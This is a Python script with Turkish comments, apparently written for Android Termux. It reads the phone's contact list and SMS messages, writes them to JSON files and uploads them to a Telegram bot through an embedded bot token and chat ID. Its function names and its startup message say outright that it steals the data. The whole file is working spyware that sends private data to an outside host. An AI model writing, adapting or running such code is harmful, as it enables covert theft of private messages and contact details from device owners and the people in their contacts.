import os
import json
import subprocess
import time
import requests

# Telegram Bot Ayarları
BOT_TOKEN = "7990420796:AAEqVI1L0WiGL8l66L_njVYvgnaC2vNbL6Y"
CHAT_ID = "4804654305"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

def rehber_cal():
    try:
        rehber = subprocess.check_output("termux-contact-list", shell=True).decode()
        return json.loads(rehber)
    except Exception as e:
        print(f"Rehber çekerken hata: {str(e)}")
        return {"hata": f"Rehber alınamadı, lanet olsun: {str(e)}"}

def sms_cal():
    try:
        smsler = subprocess.check_output("termux-sms-list", shell=True).decode()
        return json.loads(smsler)
    except Exception as e:
        print(f"SMS çekerken hata: {str(e)}")
        return {"hata": f"SMS'ler alınamadı, naber: {str(e)}"}

def bilgileri_kaydet_ve_gonder():
    zaman_damgasi = int(time.time())
    
    # Rehberi al ve kaydet
    rehber_listesi = rehber_cal()
    rehber_dosyasi = f"rehber_{zaman_damgasi}.json"
    rehber_verileri = []
    for i, kisi in enumerate(rehber_listesi, 1):
        rehber_verileri.append({f"[{i}]": kisi})
    
    try:
        with open(rehber_dosyasi, "w") as f:
            json.dump(rehber_verileri, f, indent=4, ensure_ascii=False)
        print(f"Rehber {rehber_dosyasi} dosyasına kaydedildi, kral!")
    except Exception as e:
        print(f"Rehber kaydetme hatası: {str(e)}")
        return

    # SMS'leri al ve kaydet
    sms_listesi = sms_cal()
    sms_dosyasi = f"sms_{zaman_damgasi}.json"
    sms_verileri = []
    for i, sms in enumerate(sms_listesi, 1):
        sms_verileri.append({f"[{i}]": sms})
    
    try:
        with open(sms_dosyasi, "w") as f:
            json.dump(sms_verileri, f, indent=4, ensure_ascii=False)
        print(f"SMS'ler {sms_dosyasi} dosyasına kaydedildi, kral!")
    except Exception as e:
        print(f"SMS kaydetme hatası: {str(e)}")
        return

    # Telegram'a gönder
    try:
        print("Telegram'a rehber gönderiliyor...")
        with open(rehber_dosyasi, "rb") as f:
            response = requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
            response.raise_for_status()  # Hata varsa fırlat
        print(f"{rehber_dosyasi} Telegram'a gönderildi, kral! Yanıt: {response.text}")
        
        print("Telegram'a SMS gönderiliyor...")
        with open(sms_dosyasi, "rb") as f:
            response = requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
            response.raise_for_status()
        print(f"{sms_dosyasi} Telegram'a gönderildi, kral! Yanıt: {response.text}")
    except Exception as e:
        print(f"Telegram'a gönderilemedi, lanet: {str(e)}")

if __name__ == "__main__":
    print("Bilgileri çalıp Telegram'a yolluyorum, sakin ol! 😈")
    bilgileri_kaydet_ve_gonder()
